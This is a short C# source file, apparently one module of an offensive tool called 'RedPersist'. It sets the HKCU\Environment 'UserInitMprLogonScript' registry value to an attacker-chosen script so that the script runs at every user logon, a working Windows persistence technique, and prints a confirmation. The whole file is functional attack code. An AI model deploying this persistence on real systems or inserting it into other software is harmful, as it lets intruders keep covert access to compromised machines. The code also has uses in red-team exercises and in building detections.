using Microsoft.Win32;
using System;
namespace RedPersist.Persist
{

    public class Winlogon1
    {
        public static void Do(string[] args)
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Environment");
            key.SetValue("UserInitMprLogonScript", args[1]);
            key.Close();
            Console.WriteLine("[*] UserInitMprLogonScript Persistence created");
            //  reg query "HKCU\Environment" /s"
           
        }
    }
}
